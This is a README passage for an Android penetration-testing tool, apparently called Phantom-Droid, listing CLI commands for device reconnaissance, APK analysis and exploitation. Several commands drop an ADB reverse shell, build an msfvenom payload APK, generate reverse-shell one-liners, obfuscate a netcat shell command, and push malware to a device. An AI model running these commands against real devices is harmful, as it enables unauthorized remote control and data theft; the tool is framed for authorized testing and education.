...
```bash
python3 phantom-droid.py
# or
python3 phantom-droid.py --interactive
```

### CLI Mode
```bash
# List connected devices
python3 phantom-droid.py --devices

# Full device info
python3 phantom-droid.py --device ABC123 --info

# Analyze APK + generate HTML report
python3 phantom-droid.py --apk target.apk --report html --target-name "com.example.app"

# Port scan device
python3 phantom-droid.py --device ABC123 --port-scan

# Full vulnerability scan
python3 phantom-droid.py --device ABC123 --vuln-scan --pkg com.example.app

# Check for CVEs based on Android version
python3 phantom-droid.py --device ABC123 --cve-check

# Check if device is rooted
python3 phantom-droid.py --device ABC123 --root-check

# Capture logcat (200 lines)
python3 phantom-droid.py --device ABC123 --logcat 200

# Capture screenshot
python3 phantom-droid.py --device ABC123 --screenshot

# Enable ADB over WiFi
python3 phantom-droid.py --device ABC123 --adb-wifi

# WiFi info
python3 phantom-droid.py --device ABC123 --wifi-info

# SSL pinning check
python3 phantom-droid.py --device ABC123 --ssl-pinning com.example.app

# MitM proxy setup guide
python3 phantom-droid.py --mitm-guide

# Launch exported activity
python3 phantom-droid.py --device ABC123 --exploit activity \
  --pkg com.example.app --activity com.example.app.DebugActivity

# Deep link fuzzer
python3 phantom-droid.py --device ABC123 --exploit deep-link \
  --pkg com.example.app --scheme myapp

# Drop reverse shell via ADB
python3 phantom-droid.py --device ABC123 --exploit shell-drop \
  --lhost 192.168.1.100 --lport 4444

# Generate msfvenom APK payload
python3 phantom-droid.py --payload reverse_tcp \
  --lhost 192.168.1.100 --lport 4444 --payload-out evil.apk

# Generate reverse shell one-liners
python3 phantom-droid.py --payload reverse-shells \
  --lhost 192.168.1.100 --lport 4444

# Obfuscate a command
python3 phantom-droid.py --payload obfuscate \
  --raw-payload "busybox nc 10.0.0.1 4444 -e /system/bin/sh" \
  --obfuscate-method base64

# Pull file from device
python3 phantom-droid.py --device ABC123 --pull /sdcard/secret.txt

# Push file to device
python3 phantom-droid.py --device ABC123 --push malware.apk /sdcard/malware.apk

# Discover live hosts on subnet
python3 phantom-droid.py --discover 192.168.1

# Generate JSON + HTML report
python3 phantom-droid.py --apk app.apk --device ABC123 --vuln-scan \
...
> Phantom-Droid is intended **exclusively** for authorized security assessments, CTF competitions, and educational research.
> 
...
<div align="center">
  Made with ❤️ by <strong>RS5Arif</strong> | <a href="https://instagram.com/mdarif76769">@mdarif76769</a>
</div>
